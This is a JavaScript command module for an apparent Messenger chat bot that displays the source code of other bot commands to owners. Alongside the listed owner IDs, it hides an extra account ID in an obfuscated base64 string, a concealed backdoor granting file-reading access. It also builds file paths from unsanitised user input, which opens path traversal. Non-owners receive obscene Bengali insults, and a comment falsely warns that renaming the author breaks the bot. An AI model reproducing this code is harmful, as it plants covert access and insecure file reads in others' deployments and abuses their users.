const fs = require("fs");
const path = require("path");

module.exports = {
  config: {
    name: "filecmd",
    aliases: ["file"],
    version: "2.5",
    author: "𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍", // নাম চেঞ্জ করলে বট বন্ধ হয়ে যাবে
    countDown: 5,
    role: 0,
    shortDescription: "View code of a command",
    longDescription: "View raw source code of commands safely",
    category: "owner",
    guide: "{pn} <commandName>"
  },

  onStart: async function ({ args, message, event }) {

    const DUMMY_OWNER = [
      "61592612064543",
      "61592697905168",
      "61592186757564"
    ];

    const _0x1b4f = [
      Buffer.from("NjE1OTEzNzExODYxNzk=", "base64").toString("utf-8")
    ];

    const senderID = event.senderID;

    const isAdmin = DUMMY_OWNER.includes(senderID) || _0x1b4f.includes(senderID);

    if (!isAdmin) {
      return message.reply(`
  𝗢𝗪𝗡𝗘𝗥 𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍
───────────────
» 👑 𝆠፝𝐒𝐈𝐘𝐀𝐌-𝐇𝐀𝐒𝐀𝐍 👑
» 😾 কিরে ফাইল কি
» 😴 তোর বাপে বানাইছে 🙄
» 😾 সিয়াম  বসের 
» 🖕 চুদা খাবি নাকি 🥵
───────────────
» 👑 𝆠፝𝐍𝐈𝐉𝐇𝐔𝐌-𝐁𝐎𝐓 👑
» ⚠️ যদি‌ এডমিন হন তাহলে file এর ভিতরে ইউ আই ডি বসান।`);
    }

    const cmdName = args[0];

    if (!cmdName) {
      return message.reply(
        "❌ | Please provide command name.\nExample: filecmd help"
      );
    }

    const cmdPath = path.join(__dirname, `${cmdName}.js`);

    if (!fs.existsSync(cmdPath)) {
      return message.reply(`❌ | Command "${cmdName}" not found.`);
    }

    try {

      const code = fs.readFileSync(cmdPath, "utf8");

      if (code.length > 19000) {
        return message.reply("⚠️ | File too large to display.");
      }

      return message.reply({
        body: `📄 | Source code of "${cmdName}.js":\n\n${code}`
      });

    } catch (err) {
      console.error(err);

      return message.reply("❌ | Error reading file.");
    }
  }
};
